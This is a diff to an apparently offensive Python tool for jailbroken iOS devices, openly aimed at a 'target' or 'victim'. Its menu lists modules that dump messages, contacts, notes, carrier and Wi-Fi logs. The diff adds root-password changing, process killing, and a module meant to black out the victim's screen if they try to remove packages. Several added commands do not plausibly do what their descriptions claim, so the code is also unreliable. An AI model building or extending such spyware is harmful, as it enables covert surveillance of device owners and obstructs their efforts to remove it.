@@ -49,7 +49,11 @@ class commandz(object):
             "use modules/extra/restart_springboard": "killall SpringBoard",
             "use modules/extra/boot_safemode": "touch /var/mobile/Library/Preferences/com.saurik.mobilesubstrate.dat; killall SpringBoard",
             "use modules/extra/restart_device": "kill 1",
-            "use modules/extra/get_saved_notes": "cd / && cd /var/mobile/Library/Notes/ && cat notes.sqlite"
+            "use modules/extra/get_saved_notes": "cd / && cd /var/mobile/Library/Notes/ && cat notes.sqlite",
+            "use modules/extra/change_root_password": "./passwd",
+            "use modules/network/get_mac_address": "bluetoothd",
+            "use modules/extra/screen_black_out": "cd / && cd /Applications/Cydia.app && ./Cydia",
+            "use modules/extra/kill_app": "ps aux"
         }
 
 def terminal():
@@ -87,6 +91,7 @@ def mainshell():
             modules/network/dump_wifi_logs            Dumps Wi-Fi log files and gives you the option to read them.
             modules/network/dump_carrier_logs         Dumps the phone carrier log files and gives you the option to read them. [IP logs included]
             modules/network/dump_DataUsage_DB         Dumps the DB containing the iOS device's data usage and phone number.
+            modules/network/get_mac_address           Gets the MAC-Address of the target device.
             modules/imessage/dump_SMS_DB              Dumps the DB containing the iOS device's message history.
             modules/imessage/dump_all_numbers         Dumps all the saved numbers on the iOS device's list.
             modules/imessage/emergency_alert_history  Shows the history of emergency alerts with the message. [Stuff like AMBER Alerts]
@@ -96,6 +101,9 @@ def mainshell():
             modules/extra/boot_safemode               Makes the device boot into SafeMode.
             modules/extra/restart_device              Restarts the iOS device.
             modules/extra/get_saved_notes             Gets the saved notes on the iOS device.
+            modules/extra/kill_app                    Lets you view running processes and kill them. [Like apps/services such as youtube, safari, camera, bluetooth]
+            modules/extra/screen_black_out            Makes the victims home screen go black if they attempt to enter cydia to remove packages.
+            modules/extra/change_root_password        Allows you to change the root password.
             ''')
         elif maininput == "clear":
             clear()
@@ -140,6 +148,16 @@ def mainshell():
             subprocess.call(commandz.commandz["use modules/extra/restart_device"], shell=True)
         elif maininput == "use modules/extra/get_saved_notes":
             subprocess.call(commandz.commandz["use modules/extra/get_saved_notes"], shell=True)
+        elif maininput == "use modules/extra/change_root_password":
+            subprocess.call(commandz.commandz["use modules/extra/change_root_password"], shell=True)
+        elif maininput == "use modules/network/get_mac_address":
+            subprocess.call(commandz.commandz["use modules/network/get_mac_address"], shell=True)
+        elif maininput == "use modules/extra/screen_black_out":
+            subprocess.call(commandz.commandz["use modules/extra/screen_black_out"], shell=True)
+        elif maininput == "use modules/extra/kill_app":
+            subprocess.call(commandz.commandz["use modules/extra/kill_app"], shell=True)
+            kilappinput = input("Enter PID of app you want to kill > ")
+            os.system("kill {}".format(kilappinput))
         else:
             print(f"Command [{maininput}] was not found.")
 print(bannerz)
